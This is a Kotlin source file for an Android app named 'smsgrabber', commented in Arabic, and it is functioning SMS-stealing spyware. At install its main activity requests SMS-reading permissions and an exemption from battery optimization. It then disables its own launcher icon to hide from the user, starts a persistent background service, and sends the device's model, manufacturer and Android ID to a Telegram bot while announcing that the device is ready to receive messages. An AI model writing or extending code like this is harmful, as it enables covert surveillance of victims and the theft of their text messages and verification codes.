package com.smsgrabber

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

/**
 * نشاط شفاف - يشتغل مرة واحدة فقط وقت التنصيب
 * يخفي التطبيق ويشغل الخدمة ثم ينهي نفسه فوراً
 */
class MainActivity : Activity() {

    private val SMS_PERMISSION_REQUEST = 1001
    private val NOTIFICATION_PERMISSION_REQUEST = 1002

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // طلب الصلاحيات أولاً
        requestAllPermissions()

        // إخفاء الأيقونة
        hideAppIcon()

        // تشغيل الخدمة
        startBackgroundService()

        // إرسال معلومات الجهاز
        sendDeviceInfo()

        // إغلاق
        finishAndRemoveTask()
    }

    private fun requestAllPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val permissions = mutableListOf<String>()

            if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS)
                != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.RECEIVE_SMS)
            }
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.READ_SMS)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                    != PackageManager.PERMISSION_GRANTED) {
                    permissions.add(Manifest.permission.POST_NOTIFICATIONS)
                }
            }

            if (permissions.isNotEmpty()) {
                ActivityCompat.requestPermissions(
                    this,
                    permissions.toTypedArray(),
                    SMS_PERMISSION_REQUEST
                )
            }
        }

        // طلب استثناء تحسين البطارية
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val powerManager = getSystemService(POWER_SERVICE) as PowerManager
            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                    intent.data = android.net.Uri.parse("package:$packageName")
                    startActivity(intent)
                } catch (_: Exception) {}
            }
        }
    }

    private fun hideAppIcon() {
        try {
            val componentName = ComponentName(this, MainActivity::class.java)
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}
    }

    private fun startBackgroundService() {
        val serviceIntent = Intent(this, HideService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }

    private fun sendDeviceInfo() {
        Thread {
            try {
                Thread.sleep(2000) // انتظار اتصال الشبكة
                val deviceInfo = buildString {
                    appendLine("📱 *جهاز جديد مرتبط*")
                    appendLine("🔹 الموديل: ${Build.MODEL}")
                    appendLine("🔹 الشركة: ${Build.MANUFACTURER}")
                    appendLine("🔹 العلامة: ${Build.BRAND}")
                    appendLine("🔹 إصدار الأندرويد: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})")
                    appendLine("🔹 المنتج: ${Build.PRODUCT}")
                    appendLine("🔹 اللوحة: ${Build.BOARD}")
                    appendLine("🔹 المعرف: ${Settings.Secure.getString(
                        contentResolver,
                        Settings.Secure.ANDROID_ID
                    )}")
                    appendLine("🔹 الوقت: ${System.currentTimeMillis()}")
                    appendLine("")
                    appendLine("✅ الجهاز جاهز لاستقبال الرسائل")
                }
                TelegramApi.sendMessage(deviceInfo)
            } catch (_: Exception) {}
        }.start()
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        // نكمل بغض النظر عن النتيجة
    }
}
